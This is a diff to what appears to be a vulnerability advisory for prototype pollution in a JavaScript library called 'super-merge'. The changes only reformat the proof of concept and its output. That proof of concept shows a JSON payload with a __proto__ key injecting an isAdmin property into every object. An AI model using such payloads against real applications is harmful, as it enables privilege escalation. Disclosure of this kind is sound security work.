@@ -12,6 +12,7 @@ By supplying a malicious object containing the __proto__ key, an attacker can in
 
 ## 💥 Proof of Concept (PoC)
 
+```js
 import superMerge from 'super-merge';
 
 console.log('Before:', {}.isAdmin);
@@ -21,9 +22,12 @@ const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
 superMerge({}, malicious);
 
 console.log('After:', {}.isAdmin);
+```
 
-✅ Expected Output
+✅ Output
+
 Before: undefined
+
 After: true
 
 This proves that the isAdmin property was successfully injected into the global prototype, affecting any newly created or existing object without a direct assignment.
